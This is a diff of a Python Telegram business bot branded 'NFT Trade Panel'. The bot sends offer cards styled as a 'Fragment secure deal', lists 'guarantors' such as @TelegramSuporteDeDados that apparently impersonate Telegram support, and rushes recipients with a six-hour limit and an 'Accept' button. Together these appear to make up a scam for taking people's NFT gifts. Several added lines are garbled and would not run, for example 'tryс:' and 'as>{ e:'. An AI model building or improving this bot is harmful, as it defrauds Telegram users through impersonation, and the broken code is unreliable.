@@ -42,7 +42,6 @@ def get_db():
 
 def init_db():
     with get_db() as conn:
-        # Сохраняем подписки
         conn.execute("""CREATE TABLE IF NOT EXISTS users (
             user_id INTEGER PRIMARY KEY, subscribed INTEGER DEFAULT 0,
             sub_type TEXT DEFAULT 'none', test_used INTEGER DEFAULT 0, 
@@ -105,14 +104,14 @@ def parse_price(text: str):
 # ==========================================
 async def safe_send(bot_instance: Bot, chat_id: int, text: str, conn_id: str, reply_markup=None, retries=3):
     for attempt in range(retries):
-        try:
+        tryс:
             return await bot_instance.send_message(
                 chat_id=chat_id, text=text, business_connection_id=conn_id,
-                reply_markup=reply_markup,
-                disable_web_page_preview=False
+                reply:_markup=reply_markup,
+ <                disable_web_page_previewb=False
             )
-        except TelegramBadRequest as e:
-            if "PEER_FLOOD" in str(e): 
+        except TelegramBadRequest as>{ e:
+            if "PEER_FLOOD"status in str(e): 
                 await asyncio.sleep(30)
             else:
                 log.error(f"Ошибка Telegram: {e}")
@@ -155,7 +154,7 @@ async def show_main_menu(target, uid):
     
     text = (
         f"👑 <b>NFT Trade Panel</b>\n\n"
-        f"Статус: <b>{status}</b>\n"
+        f"Стату}</b>\n"
         f"Создано офферов: <b>{user['stats_created']}</b>\n"
         f"Успешных передач: <b>{user['stats_accepted']}</b>\n\n"
         f"<b>Создать оффер:</b>\n<code>/offer [ссылка] [цена] [@юзер]</code>"
@@ -348,12 +347,12 @@ async def cmd_cancel_offer(msg: Message):
         else: await msg.reply("❌ Не найден.")
 
 # ==========================================
-# ОТПРАВКА ОФФЕРА
+# ОТПРАВКА ОФФЕРА (ФИКС КАРТИНКИ)
 # ==========================================
 @router.business_message(F.text)
 async def handle_business_message(msg: Message):
-    log.info(f"🔥 BUSINESS MSG: from={msg.from_user.id}, text={msg.text}")
-    
+    if msg.from_user and msg.from_user.is_bot: return # Игнорируем ботов
+
     m = CODE_RE.search(msg.text)
     if not m: return
     oid = m.group(1).lower()
@@ -373,13 +372,14 @@ async def handle_business_message(msg: Message):
         log.error("❌ Нет conn_id")
         return
 
-    # ВАЖНО: Удаляем и отправляем через ТОГО бота, который поймал сообщение (msg.bot)
     await delete_code_message(msg.bot, msg.chat.id, msg.message_id, conn_id)
     await asyncio.sleep(1.5)
 
     price_str = f"{offer['price_amount']} ⭐️" if offer["price_currency"] == "Stars" else f"{offer['price_amount']} Gram"
     nft_link = f"https://t.me/nft/{offer['nft_slug']}"
 
+    # ФИКС: Убираем все голые ссылки, кроме NFT. 
+    # Ссылки на Fragment и Гарантов прячем в теги <a>, чтобы Telegram не подтягивал их картинки.
     card_text = (
         f"<b>🛡 Fragment · Безопасная сделка #{oid.upper()[3:]}</b>\n"
         f"━━━━━━━━━━━━━━━━━━━━\n"
@@ -389,7 +389,7 @@ async def handle_business_message(msg: Message):
         f"🔒 <b>Гаранты:</b> <a href='https://t.me/TelegramSuporteDeDados'>@TelegramSuporteDeDados</a>, <a href='https://t.me/notoscam'>@notoscam</a>\n"
         f"⏱ <b>Лимит времени:</b> 6 часов до отмены резерва.\n\n"
         f"<i>Для полной резервации суммы и автоматическим подключением гарантий, нажмите «Принять» ниже.</i>\n\n"
-        f"{nft_link}"
+        f"{nft_link}" # <--- Единственная голая ссылка для превью внизу
     )
 
     kb = InlineKeyboardMarkup(inline_keyboard=[
